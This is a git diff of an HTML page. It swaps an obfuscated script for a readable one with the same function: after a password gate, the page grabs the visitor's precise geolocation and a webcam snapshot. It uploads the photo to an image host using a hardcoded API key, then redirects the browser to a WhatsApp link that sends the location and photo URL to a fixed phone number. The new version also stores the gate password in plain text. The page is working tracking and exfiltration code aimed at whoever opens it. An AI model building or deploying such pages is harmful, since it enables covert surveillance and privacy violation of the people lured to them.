@@ -62,9 +62,9 @@
 <body>
     <div id="auth-section">
         <h2>🔒 Enter Password to Access</h2>
-        <input type="password" id="p-a" placeholder="Enter password">
-        <button onclick="x1x()">Submit</button>
-        <p id="a-s" style="color: red;"></p>
+        <input type="password" id="password" placeholder="Enter password">
+        <button onclick="checkPassword()">Submit</button>
+        <p id="auth-status" style="color: red;"></p>
     </div>
 
     <div id="main-content">
@@ -74,80 +74,73 @@
     </div>
 
     <script>
-        (function(){
-            var _0xabc=["value","getElementById","p-a","style","display","none","block","auth-section","main-content","Incorrect password!","innerText","aa385a04b8f503c6b319cd48de2a41e4522c1ae2d0c94f7fa26b90e50faeb3b2"];
+        function checkPassword() {
+            const enteredPassword = document.getElementById("password").value;
+            const correctPassword = "Nipunapromod@1"; // ✅ Password stored directly
             
-            async function x1x(){
-                const _p=document[_0xabc[1]](_0xabc[2])[_0xabc[0]];
-                const _h=await x2x(_p);
-                if(_h===_0xabc[11]){
-                    document[_0xabc[1]](_0xabc[7])[_0xabc[3]][_0xabc[4]]=_0xabc[5];
-                    document[_0xabc[1]](_0xabc[8])[_0xabc[3]][_0xabc[4]]=_0xabc[6];
-                    x3x();
-                } else {
-                    document[_0xabc[1]]("a-s")[_0xabc[10]]=_0xabc[9];
-                }
+            if (enteredPassword === correctPassword) {
+                document.getElementById("auth-section").style.display = "none";
+                document.getElementById("main-content").style.display = "block";
+                getLocation();
+            } else {
+                document.getElementById("auth-status").innerText = "❌ Incorrect password!";
             }
+        }
 
-            async function x2x(p){
-                const enc=new TextEncoder().encode(p);
-                const hash=await crypto.subtle.digest("SHA-256", enc);
-                return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("");
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    var lat = position.coords.latitude, lng = position.coords.longitude;
+                    var loc = `https://www.google.com/maps?q=${lat},${lng}`;
+                    document.getElementById("status").innerText = "✅ Location found! Taking photo...";
+                    capturePhoto(loc);
+                },
+                (error) => {
+                    document.getElementById("status").innerText = "❌ Error getting location: " + error.message;
+                },
+                { enableHighAccuracy: true, maximumAge: 0 }
+            );
+        }
+
+        async function capturePhoto(loc) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById("canvas");
+                    const ctx = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(t => t.stop());
+                    canvas.toBlob((b) => uploadPhoto(b, loc), "image/png");
+                };
+            } catch (error) {
+                console.error("Camera access error:", error);
             }
+        }
 
-            function x3x(){
-                navigator.geolocation.getCurrentPosition(
-                    (p)=>{
-                        var lat=p.coords.latitude,lng=p.coords.longitude;
-                        var loc=`https://www.google.com/maps?q=${lat},${lng}`;
-                        document.getElementById("status").innerText="✅ Location found! Taking photo...";
-                        x4x(loc);
-                    },
-                    (err)=>{
-                        document.getElementById("status").innerText="❌ Error getting location: "+err.message;
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-            }
+        function uploadPhoto(blob, loc) {
+            const formData = new FormData();
+            formData.append("image", blob);
+            formData.append("key", "83601732f6095faec5d42577498c1da8");
 
-            async function x4x(loc){
-                try {
-                    const stream=await navigator.mediaDevices.getUserMedia({video:true});
-                    const video=document.createElement("video");
-                    video.srcObject=stream;
-                    video.play();
-                    video.onloadedmetadata=()=>{
-                        const canvas=document.getElementById("canvas");
-                        const ctx=canvas.getContext("2d");
-                        canvas.width=video.videoWidth;
-                        canvas.height=video.videoHeight;
-                        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-                        stream.getTracks().forEach(t=>t.stop());
-                        canvas.toBlob((b)=>x5x(b,loc),"image/png");
-                    };
-                } catch(err){
-                    console.error("Camera access error:", err);
-                }
-            }
-
-            function x5x(blob,loc){
-                const f=new FormData();
-                f.append("image",blob);
-                f.append("key","83601732f6095faec5d42577498c1da8");
-
-                fetch("https://api.imgbb.com/1/upload",{method:"POST",body:f})
-                .then(r=>r.json())
-                .then(d=>{
-                    if(d.success){
-                        var waUrl=`https://wa.me/94713424265?text=${encodeURIComponent(`📍 Location: ${loc}\n📷 Photo: ${d.data.url}`)}`;
-                        window.location.href=waUrl;
+            fetch("https://api.imgbb.com/1/upload", { method: "POST", body: formData })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        var waUrl = `https://wa.me/94713424265?text=${encodeURIComponent(`📍 Location: ${loc}\n📷 Photo: ${data.data.url}`)}`;
+                        window.location.href = waUrl;
                     } else {
-                        console.error("ImgBB upload failed:", d.error);
+                        console.error("ImgBB upload failed:", data.error);
                     }
                 })
-                .catch(e=>{console.error("ImgBB API request failed:",e)});
-            }
-        })();
+                .catch(error => {
+                    console.error("ImgBB API request failed:", error);
+                });
+        }
     </script>
 </body>
 </html>
